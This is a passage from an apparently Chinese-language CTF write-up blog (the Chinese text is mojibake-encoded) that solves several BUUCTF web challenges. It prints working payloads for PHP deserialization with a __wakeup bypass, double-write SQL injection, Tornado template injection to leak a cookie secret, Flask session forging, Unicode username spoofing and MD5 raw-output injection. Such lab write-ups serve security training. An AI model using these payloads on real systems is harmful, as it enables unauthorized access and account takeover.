class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Name(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br>    <span class="hljs-comment">//ç»“æœï¼šO%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br><span class="hljs-comment">//åˆ«å¿˜äº†è¿˜æœ‰ä¸€ä¸ª __wakeup è¿™ä¼šå½±å“åˆ°username ï¼Œå¯ä»¥ä¿®æ”¹ Nameåçš„æ•°å€¼æ¥ç»•è¿‡ CVE-2016-7124</span><br><span class="hljs-comment">//è¿™ä¸ªpayload å°±è¡Œ index.php?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>ç»è¿‡æµ‹è¯•è¿‡æ»¤äº†å¾ˆå¤šsqlå‡½æ•°ï¼Œä¸èƒ½å¤§å†™ç»•è¿‡ï¼Œä½†æ˜¯å¯ä»¥åŒå†™</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">160</span>d<span class="hljs-number">7</span>b<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">-1080</span><span class="hljs-number">-467</span>d<span class="hljs-number">-9261</span><span class="hljs-number">-01</span>cef<span class="hljs-number">19e14</span>f<span class="hljs-number">3</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span>admin&#x27; ununionion seselectlect <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>group_concat(table_name)frfromom(infoorrmation_schema.tables)<br>whwhereere table_schema<span class="hljs-operator">=</span>database() <span class="hljs-variable">%23</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-number">7852e8</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ffdf<span class="hljs-number">99e34</span>f<span class="hljs-number">06e3</span>cbc<span class="hljs-number">9</span>ebcb<span class="hljs-number">5</span><br>æœ€ç»ˆpayload<br><span class="hljs-symbol">http:</span>//<span class="hljs-number">160</span>d<span class="hljs-number">7</span>b<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">-1080</span><span class="hljs-number">-467</span>d<span class="hljs-number">-9261</span><span class="hljs-number">-01</span>cef<span class="hljs-number">19e14</span>f<span class="hljs-number">3</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/check.php?username<span class="hljs-operator">=</span>admin&amp;password<span class="hljs-operator">=</span>pwd <span class="hljs-variable">%27</span> ununionion seselectlect <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag)frfromom(ctf.Flag)<span class="hljs-variable">%23</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-number">7852e8</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ffdf<span class="hljs-number">99e34</span>f<span class="hljs-number">06e3</span>cbc<span class="hljs-number">9</span>ebcb<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>ç»è¿‡æµ‹è¯•ï¼Œå¤‡ä»½æ–‡ä»¶åä¸º index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = intval(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹ï¼Œå¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ</p><p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ä¼ å…¥ ?key=123 å³å¯</p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>çœ‹åˆ°ä¸€ä¸‹ä¿¡æ¯</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">welcome.txt</span><br><span class="ruby"></span>render            #è”æƒ³åˆ°ssti<br>-<span class="ruby">/flag <span class="hljs-comment">#</span></span><br><span class="ruby"></span>flag in /fllllllllllllag<br>-<span class="ruby">hints.txt</span><br><span class="ruby"></span>md5(cookie_secret+md5(filename))  getflagæ–¹æ³•<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">/error?msg=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>è·å–cookie_secret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><br>filename=<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span><br>cookie_secret=<span class="hljs-string">&quot;02b76ca5-817f-4887-baf1-a6c7556d97a5&quot;</span><br><span class="hljs-built_in">hash</span>.update(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>s1=<span class="hljs-built_in">hash</span>.hexdigest()<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-built_in">hash</span>.update((cookie_secret+s1).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091801316.png" alt="image-20220109180135246"></p><p>æœ€åä¼ å…¥ï¼Œè·å–flag å”‰ è¿™é¢˜å¥½ä¹Ÿä¸å¥½ ç›¸å…³å‚æ•°éƒ½æ²¡è¯´æ˜ å‚ä¸æ„Ÿæœ‰ç‚¹å¼± çŸ¥è¯†ç‚¹å€’æ˜¯ä¸éš¾</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/file?filename<span class="hljs-operator">=</span>/fllllllllllllag&amp;filehash<span class="hljs-operator">=</span><span class="hljs-number">36</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">34</span>a<span class="hljs-number">3</span>b<span class="hljs-number">5</span>f<span class="hljs-number">640</span>a<span class="hljs-number">3</span>be<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">664536</span><span class="hljs-keyword">c</span><span class="hljs-number">8e81</span><br></code></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>å¯ä»¥å¾ˆå®¹æ˜“è”æƒ³åˆ° è¿™ä¸€å®šä¼šå’Œä¿®æ”¹HTTPæ•°æ®åŒ…æœ‰å…³</p><p>åœ¨MENUä¸‹æ‹‰èœå•é‡Œï¼Œå‘ç°äº† pay.php</p><p>å¾—åˆ° hints</p><blockquote><p>If you want to buy the FLAG:<br>You must be a student from CUIT!!!<br>You must be answer the correct password!!!</p><p>FLAG NEED YOUR 100000000 MONEY</p></blockquote><p>æºç ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>~~~post money <span class="hljs-keyword">and</span> password~~~<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span> (is_numeric(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>æœ‰å‡ ä¸ªæ³¨æ„çš„ç‚¹ ä¸Šé¢è¿™ä¸ªphpæºç  è€ƒå¯Ÿphpå¼±ç±»å‹ æˆ‘ä»¬è®©404a å’Œ 404ç›¸æ¯”å°±å¯ä»¥é€šè¿‡</p><p>ç„¶å money=100000000 ä½†æ˜¯ æœåŠ¡å™¨æ¥å—ä¸äº†è¿™ä¸ªæ•°æ® æˆ‘ä»¬æ¢æˆ 1e10</p><p>åŒæ—¶åœ¨cookieä¸­å­˜åœ¨ userå­—æ®µ æŠŠä»–ä¿®æ”¹æˆ 1 å°±å¥½(æ˜æ˜¾æ ‡å¿—èº«ä»½çš„å˜é‡é0å³1)  æ•°æ®åŒ…å¦‚ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/pay.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>24<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81/pay.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6; user=1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="apache"><span class="hljs-attribute">password</span>=<span class="hljs-number">404</span>a&amp;money=<span class="hljs-number">1</span>e<span class="hljs-number">10</span></span><br></code></pre></td></tr></table></figure><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>æ²¡æ€è·¯â€¦ ï¼Œçœ‹äº†çœ‹æœ‰ä¸‰ç§è§£æ³•</p><h3 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h3><p>u:admin p:123</p><h3 id="Flaskä¼ªé€ session"><a href="#Flaskä¼ªé€ session" class="headerlink" title="Flaskä¼ªé€ session"></a>Flaskä¼ªé€ session</h3><p>æ€ä¹ˆçŸ¥é“çš„æ˜¯Flaskï¼Œåœ¨ç”¨æˆ·ç™»å…¥ä¹‹å é¡µé¢æºä»£ç ç»™äº†gitåœ°å€</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui grid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;four wide column&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eight wide column&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui form segment&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;field required&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>NewPassword<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;newpassword&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;newpassword&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui button fluid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;æ›´æ¢å¯†ç &quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p>è·Ÿè¿›githubåœ°å€ è¿›è¡Œæºç å®¡è®¡</p><p><code>app/config.py</code> å‘ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    SECRET_KEY = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;ckj123&#x27;</span><br>    SQLALCHEMY_DATABASE_URI = <span class="hljs-string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br>    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>å…ˆå¯¹sessionè¿›è¡Œè§£å¯†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python .\flask_session_cookie_manager3.py decode -c .eJw90MGKwjAQBuBXWebsodH0UvBg6TasMAmV1DC5iK61NTYuVKW24rtv1gWPwz_zMTMP2By66tJAcu1u1QQ2xz0kD_jYQQLoUq-M9TI7MRzX3nrkaHIvHY7KlFPMlg2ZcqCxdUrT3RrsSZex1TVTGnsci9BfRla3Dg1xHBsnBQ7yb1YvHU4puBShWwzk9k4amlmdNyjy1opVq4T05GmGAu_BYyhWHkNNjrjSi5hcPZOiiDAr5vCcwPelO2yuP6fq_D4hrMqsod5mspEmkNknD-txFAWzWdrK8YuRX3slysCcuBK5w37-4o5-W1dvqRJxSsV_ct76EACDCdwuVff6GbAInr89XGmn.YdrY7g.FrFc4vSZxr6D-SNKQFbbl0mkZWw<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201092047501.png" alt="image-20220109204748408"></p><p>nameå­—æ®µæ˜¯åˆšåˆšç™»é™†çš„ç”¨æˆ·å ç›®æ ‡æ˜¯è®©ä»–å˜æˆadmin</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python .\flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;20f9ff49535ffc81af6339e602aae2c9c961ec0a59e859303481e4e9c1f838c4c25e612c3f5364202b7c5f7e1a0aedde8cfbf70c19350df2f7b68909b874d404&#x27;, &#x27;csrf_token&#x27;: b&#x27;635ef0d3a5de818e880d5d0e725bef8e40988ac3&#x27;, &#x27;image&#x27;: b&#x27;xnAa&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;<br></code></pre></td></tr></table></figure><p>ä¹‹åç”¨æˆ‘ä»¬å¾—åˆ°çš„ sessionå¯¹åŸsessionè¿›è¡Œæ›¿æ¢å³å¯</p><h3 id="Unicodeæ¬ºéª—"><a href="#Unicodeæ¬ºéª—" class="headerlink" title="Unicodeæ¬ºéª—"></a>Unicodeæ¬ºéª—</h3><p>æ¯”è¾ƒç»å…¸ä½†æ˜¯ä¸å¤ªå®¹æ˜“æƒ³åˆ°çš„æ´ï¼Œåœ¨ä¸‹é¢è¿™ä¸ªç½‘ç«™æœç‰¹å®šå­—ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://unicode-table.com/en/search/?q=admin<br></code></pre></td></tr></table></figure><p>ç»„æˆ á´¬á´°á´¹á´µá´º æ³¨å†Œä¸€ä¸ªè´¦å· ç„¶åä¿®æ”¹å¯†ç  å³å¯ä¿®æ”¹ adminçš„å¯†ç </p><p>åœ¨æ³¨å†Œçš„æ—¶å€™ â€á´¬á´°á´¹á´µá´ºâ€œ ç»è¿‡strlower()ï¼Œè½¬æˆâ€ADMINâ€œ ï¼Œ åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™ â€ADMINâ€œç»è¿‡strlower()å˜æˆâ€adminâ€œ </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201092120281.png" alt="image-20220109212015184"></p><p>å®é™…åˆ©ç”¨æ€è·¯æ˜¯è¿™æ · æ³¨å†Œ á´¬á´°á´¹á´µá´º ç»è¿‡ä¸€æ¬¡ strlower =&gt; ADMIN  ç„¶åä¿®æ”¹å¯†ç è§¦å‘changeå‡½æ•°å†…çš„strlower ADMIN =&gt; admin</p><p>è¿™æ ·å®é™…ä¸Šä¿®æ”¹çš„å°±æ˜¯adminçš„å¯†ç äº†</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>è€ƒå¯Ÿäº†ä¸‰ä¸ªMD5çš„ç‚¹</p><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>ä¸€è¿›ç¯å¢ƒï¼Œå°±ä¸€ä¸ªæ¡†æ¡†ï¼Œæ²¡å•¥æ€è·¯ï¼Œç„¶åæˆ‘curläº†ä¸€ä¸‹ã€‚åœ¨æ•°æ®åŒ…ä¸­å‘ç°äº†è¿™ä¸ªHint</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">RawContent        : HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>                    Transfer-<span class="hljs-keyword">Encoding</span>: chunked<br>                    <span class="hljs-keyword">Connection</span>: keep-alive<br>                    Hint: <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span>=md5($pass,<span class="hljs-keyword">true</span>)<br>                    Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html; charset=UTF<span class="hljs-number">-8</span><br>                    <span class="hljs-type">Date</span>: Mon, <span class="hljs-number">10</span> Jan <span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">14</span>:<span class="hljs-number">22.</span>..<br></code></pre></td></tr></table></figure><p>æ€è·¯æ¯”è¾ƒå›ºå®š <code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">å¤§ä½¬é“¾æ¥:http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>mslc.ctf.su<span class="hljs-operator">/</span>wp<span class="hljs-operator">/</span>leet<span class="hljs-operator">-</span>more<span class="hljs-number">-2010</span><span class="hljs-operator">-</span>oh<span class="hljs-operator">-</span>those<span class="hljs-operator">-</span>admins<span class="hljs-operator">-</span>writeup<span class="hljs-operator">/</span><br>æ„æ€æ˜¯ï¼Œ <span class="hljs-keyword">SELECT</span> login <span class="hljs-keyword">FROM</span> admins <span class="hljs-keyword">WHERE</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&lt;trash&gt;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1&lt;shit&gt;&#x27;</span> <span class="hljs-keyword">or</span> åè·Ÿé<span class="hljs-number">0</span>å¼€å¤´çš„æ•°æ®å°±ä¼šè¿”å›ä¸º<span class="hljs-literal">TRUE</span><br><br></code></pre></td></tr></table></figure><p>å¤§ä½¬çš„è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;;) &#123; <br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">1000000</span>; <span class="hljs-variable">$c</span>++, <span class="hljs-variable">$i</span>++)<br>  <span class="hljs-keyword">if</span> (stripos(md5(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)<br>   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . md5(<span class="hljs-variable">$i</span>, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>  <span class="hljs-comment">//ç»™ä¸€ä¸ªå¸¸ç”¨çš„ payload ffifdyop</span><br></code></pre></td></tr></table></figure><p>ä¼ å…¥å³å¯ä¸‹ä¸€å…³</p><h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span 